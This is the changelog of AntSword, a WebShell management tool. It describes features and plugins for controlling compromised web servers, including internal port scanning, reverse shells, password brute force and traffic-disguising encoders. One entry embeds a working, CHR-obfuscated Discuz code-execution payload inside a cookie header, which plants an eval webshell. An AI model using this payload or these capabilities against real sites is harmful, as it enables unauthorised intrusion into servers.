# 更新日志
> 有空会补补BUG、添添新功能。    
> 同时也欢迎大家的参与！感谢各位朋友的支持！ .TAT.

## 2018/08/25 `(v2.0.0)`

### 模块增强

* **新增源代码加载器**

 从 **v2.0.0-beta** 版本开始，我们引入了**加载器**这一概念。
 
 用户/开发者只需要下载对应平台的加载器，无需安装额外的环境，即可对源代码进行**编辑**、**执行**、**调试**等操作。可直接运行>=v2.0-beta版本的**开发版**和**发行版**源代码。
 
 > 有关「加载器」的具体使用方式，可直接查阅 《[AntSowd文档——获取蚁剑](https://doc.u0u.us/zh-hans/getting_started/get_antsword.html)》
 
 ![首次打开加载器](http://7xtigg.com1.z0.glb.clouddn.com/doc/getting_started/get_antsword_1.jpg)

* **新增「加载插件」模块**

 从 **v2.0.0-beta** 版本开始，我们引入了「插件」这一概念，用户可在不修改核心框架的情况下，通过安装不同的插件来增强、扩展蚁剑的功能。
 
 端口扫描、Socks代理、反弹Shell、内网漏洞扫描、内网代理浏览器、内网漏洞溢出测试、后门扫描、密码爆破、打包下载、交互式终端、权限提升...
 
 **这里将没有任何拘束，可以尽情展现出你对WebShell的理解**。
 
 安装插件后，可通过「加载插件」模块调用指定插件。插件有两种调用方式，分别为「单个调用」和「批量调用」，在加载插件后，根据具体的插件显示不同的结果。
 
 > 有关「加载插件」的使用方式，可直接查阅 《[AntSowd文档——加载插件](https://doc.u0u.us/zh-hans/plugins/load_plugin.html)》
 >
 > 如果你对编写插件有兴趣，可查阅 《[AntSowd文档——插件开发](https://doc.u0u.us/zh-hans/plugin_dev/index.html)》，学习如何编写自己的插件。

 **调用插件：**
 
 ![调用 phpinfo插件](http://7xtigg.com1.z0.glb.clouddn.com/doc/plugins/load_plugin_1.jpg)
 
 **端口扫描插件的调用结果：**
 ![端口扫描插件](http://7xtigg.com1.z0.glb.clouddn.com/doc/plugins/load_plugin_4.jpg)
 
* **新增「插件市场」模块**

 有了插件功能，如何获取插件呢？从 **v2.0.0-beta** 版本开始，我们引入了「插件市场」。插件作者可将自己插件提交至「插件市场」，向所有AntSword使用者分享自己的插件。

 > 详见《[AntSowd文档——插件市场](https://doc.u0u.us/zh-hans/plugin_store/index.html)》

 ![插件市场](http://7xtigg.com1.z0.glb.clouddn.com/doc/plugin_store/main_page_2.jpg)

* **新增「编码管理」模块**(thx @virink)

 现在可以在「系统设置 - 编码管理」下增加用户自定义的编码器了，不需要拘泥自带的 `base64` 与 `chr`。`rot13`、`base32`、`rc4`、`aes`......尽情发挥吧
 
  ![编码管理](http://7xtigg.com1.z0.glb.clouddn.com/doc/settings/encoder_edit_1.png)

* **新增「显示设置」模块**

 Shell数据列表显示太多，有些列就不能隐藏掉吗？完全没问题。

* **新增「浏览网站」模块**

 碰到需要 Cookie 或者 Basic 认证的站点还要我亲自抓包来填到请求头上去？太麻烦了，直接浏览网站后点击「保存」就能自动将结果添加到 Shell 设置里了。

### 功能增强

* **新增「网站备注」功能**(thx @virink)

 Shell 太多，容易忘记？没关系。添加备注功能来了。

* **新增自定义「HTTP 头」和「请求数据」功能**

 一些奇奇怪怪的 Shell 和奇奇怪怪的网站居然要在请求的时候带上额外的 HTTP 字段？没关系，添加Shell时加上相应的请求字段就好了。

* **新增自定义「HTTP 请求超时」功能**

 默认的 10s 超时在网速慢的时候动不动请求超时简直让人抓狂，呐，根据当前Shell的实际情况修改吧。

* **新增自定义「虚拟终端执行路径」功能**

 偶尔也想换个自己的命令解释程序。

* **新增自定义「虚拟终端缓存」功能**

 网络差的时候，将命令执行结果缓存起来（**默认关闭**）。

* **新增自定义「文件管理缓存」功能**

 网络差的时候，将文件管理的结果缓存起来（**默认开启**）。

* **新增自定义「忽略HTTPS证书」功能**

 过期证书站点请求总是因为证书问题请求失败，那就忽略证书检查吧。

* **新增「随机编码器」功能**

 每次请求时在当前可用编码器中随机选择一种(编码器:「嚯，哈，看我72变」)。

* **优化虚拟终端，新增「命令补全」功能**

 常用的命令敲的多了想吐？来试试在「虚拟终端」下按 **Tab**键自动补全吧。

* **优化虚拟终端, 支持命令行粘贴**

 吐槽了很久的不能粘贴命令的「虚拟终端」终于支持粘贴了。

* **新增「数据库配置」编辑功能**

 再也不用删掉配置新建了。

* **新增「系统托盘」功能**

 窗口多的时候快速隐藏/呼出蚁剑（图标什么的别跟我说丑，你找个好看的给大伙瞅瞅?）。

* **新增「预览文件」功能**

 双击文件自动预览 1.5MB 以内图片，大于该体积的图片可在菜单中选择「预览文件」。
 ![](http://7xtigg.com1.z0.glb.clouddn.com/doc/file_manager/previewfile.png)

* **优化文件管理，文件列表快速跳行**

 按下键盘，自动跳到该字母开头的第一个文件所在行。

* **优化「自动更新」功能**

 程序启动后1分钟自动检查更新，如果存在更新，在提示用户的同时，可直接在线更新。

### 插件

* **新增「端口扫描」插件**

 通过 Shell 扫描内网主机开放的端口。(前面已经看过图了，就不放了)。

* **新增「生成Shell」插件**

 指定密码或者随机产生连接密码，然后随机生成一个 Shell 脚本。
 
 ![生成Shell](http://7xtigg.com1.z0.glb.clouddn.com/plugins/genshell/genshell.png)

* **新增「复制Shell配置」插件**

 团队合作管理网站必备，复制的不仅是个连接密码，还有数据库配置与 HTTP 配置。

* **新增「Shell配置导入」插件**

 跟楼上那个配合使用的 :)
 
 要不你试试导入一下下面这个 Discuz 代码执行，直接连接的模版？
 
 ```
 {"category":"default","url":"http://127.0.0.1/viewthread.php?tid=13&extra=page=1","pwd":"ant","type":"php","ip":"127.0.0.1","addr":"IANA 保留地址用于本地回送","encode":"UTF8","encoder":"chr","httpConf":{"body":{},"headers":{"Cookie":"GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;GLOBALS[_DCACHE][smilies][replacearray]=eval(CHR(64).CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(39).CHR(97).CHR(110).CHR(116).CHR(39).CHR(93).CHR(41).CHR(59))%3B;"}},"otherConf":{"command-path":"","ignore-https":1,"request-timeout":"5000","terminal-cache":0},"ctime":1489394564927,"utime":1533179198874,"_id":"8Uhsn1z0yeUXS5iG","note":""}
 ```

* **新增「超级终端」插件**

 虚拟终端执行命令不能交互，想要个交互式的 Shell？还想直接穿透内网？这里有个Demo了解一下？
 
 [WebShell下的交互式Shell](http://blog.evalbug.com/2018/07/25/antsword_prompt_shell/)
 
 > 该插件暂时不太稳定，鉴于有朋友想尝试一下，所以提前上了，别抱太大希望。

* **新增「BugScan 插件」插件**

 通过 Shell 快速创建 BugScan 节点，然后就可以对内网进行安全检测了。

### 其它
* 新增 ASP xxxxdog 编码器与对应 Shell 示例

 这个编码器只能用连接专属 Shell。试着阅读一下这两个脚本，对你编写自己的编码器和专属Shell会很有帮助。
* 新增 PHP `chr16`、`rot13` 编码器
* 新增 JSPX Script 示例
* 新增 ASP.Net eval Script 示例
* 新增 ASP.Net Custom Script 示例
* 修复 PHP Shell 读特殊文件无返回问题
* 修复Windows存在A盘时hang住的问题
* 新增更新 HTTP 配置 API
* 修复插件市场删除插件失败的问题
* 修复多窗口关闭错误问题
* 修复一些数据错误
* 优化清空所有缓存功能
* 优化删除缓存功能
* 优化删除数据功能
* 优化编辑数据功能
* 一些细节的调整
* 更新 FontAwesome 库到 **v4.5.0**
* 更新 electron API 到 **v1.2.3**
 > 这个版本号读起来顺

* 移除 log4js 模块，把后端日志传递到前端输出

 打开「开发者工具」，在「Console」下试着敲 `antSword["logs"]` 就可查看日志啦。

## 2016/05
### /03-30
  **进行了大范围的代码重写以及新功能增加**
  1. 插件市场包括下载管理等设计
  2. 插件执行包括模块化等架构
  3. 日志输出以及其他多出细节的调整

### /02
  1. 移除`babel`依赖，采用原生ES6进行前端架构
  2. 移除`document`以及`screenshots`目录，减少体积
  3. 移除`log4js`模块，把后端日志输出转换到前台控制台

## 2016/04

### /30 `(v1.3.0)`
  1. 重构优化部分代码，删除部分无用资源

### /29
  1. 增加php中的`mysql`数据库模板，用于不支持使用`mysqli`的服务器

### /28
  1. 修正custom shell 读取自身时数据被截断的 bug
  2. 添加 aspx hex encoder 支持

### /27
  1. 新增了后端配置文件`modules.config.js`
  2. 重写优化了部分后端模块
  3. 使用了`npm3`进行依赖模块安装，便于打包发布

### /25
  1. 移除`webpack`以及其他不必要的依赖，直接无需编译即可执行ES6代码（有新模块`babel`的加入，请使用`npm install`初始化
  2. 更新美化关于页面
  3. 重构`modules/request.js`后端数据请求模块

### /24 `(v1.2.1)`
  1. 重写前端资源加载方案
  2. 优化部分ES6代码

### /23
  1. 更新美化关于页面
  2. 修正 Aspx 中代码根据用户配置自动编码

### /22
  1. 修补 aspx 连接和文件管理的 Bug // &2:Thanks [@Medicean][medicaean-github]
  2. 新添加了 aspx base64 编码器

### /16 `(v1.2.0)`
  1. 重新架构核心模块编码器
  2. 优化shellmanager添加/编辑功能
  3. 重构语言模板加载方案
  4. 增加中文部分开发文档

### /14
  1. 增加文件管理模块拖拽文件上传功能

### /13
  1. 完全重写优化核心代码架构
  2. 增强文件下载功能，支持稳定下载大文件
  3. 优化HTTP请求函数
  4. 增加显示文件管理左侧目录数

### /12
  1. 修复文件管理模板XSS安全问题

### /10 `(v.1.1.2)`
  1. 增加文件管理中可执行文件的提示样式
  2. 调整文件管理中任务面板默认折叠（当有任务时自动展开

### /06
  1. 添加 PHP Custom Spy，及多个 Shell 样本 // Thanks:[@Medicean][medicaean-github]

## 2016/03

### /30
  1. 修正更新菜单栏判断条件（win禁止按钮

### /29 `(v.1.1.1)`
  1. 完成在线更新功能（目前不支持windows以及开发版本

### /26
  1. 文件管理双击：size < 100kb ? 编辑 : 下载
  2. 调整 Custom 方式数据库部分代码 // 2-4:感谢[@Medicean][medicaean-github]
  3. 添加 Shells 目录, 用于存放 shell 样本代码
  4. 添加 `custom.jsp` 服务端样本代码

### /24
  1. 文件管理双击文件进行编辑 //size < 100kb

### /23 `(v1.1.0)`
  1. 优化数据处理截断算法

### /22
  1. 数据分类重命名
  2. 新增代理连接配置 // 感谢[@Medicean][medicaean-github]

### /21
  1. 优化UI组建自适应，在调整窗口大小的时候不刷新就能调整UI尺寸

### /18
  1. 修复数据库XSS安全隐患以及特殊符号处理 // 感谢[@peablog][peablog-github]

### /15
  1. 修复了部分XSS遗留问题（主要在语言模板以及文件管理上还有虚拟终端等，其他地方可能还存在 // 感谢[@loveshell][loveshell-github]

### /14
  1. 修复文件管理中过滤不当引发的xss安全问题
  2. 增加窗口调整大小刷新UI之前弹框提醒用户选择是否刷新
  3. 删除无用语言包（jp）
  4. 更新支持PHP7 // 感谢[@Lupino][Lupino-github]
    1. 删除`core/php/index.jsx`中的`@set_magic_quotes_runtime(0);`
    2. 升级`core/php/template/database/mysql.jsx`中的`mysql`为`mysqli`

### /13
  1. 修复源码中`jquery`库缺失问题

# 待做事项
  * 数据高级搜索功能
  * 数据库配置编辑功能
  * 虚拟终端复制粘贴tab补全
  * 插件模块 //实时编写插件执行、UI以及各种操作API设计
  * 扩展模块 //用于扩展一些高级的功能，懒人必备
  - 代码重构
  - 中文开发文档
  * 英文说明+开发文档
  * nodejs服务端脚本支持
  * python服务端脚本支持


[medicaean-github]: https://github.com/Medicean
[peablog-github]: https://github.com/peablog
[loveshell-github]: https://github.com/loveshell
[Lupino-github]: https://github.com/Lupino
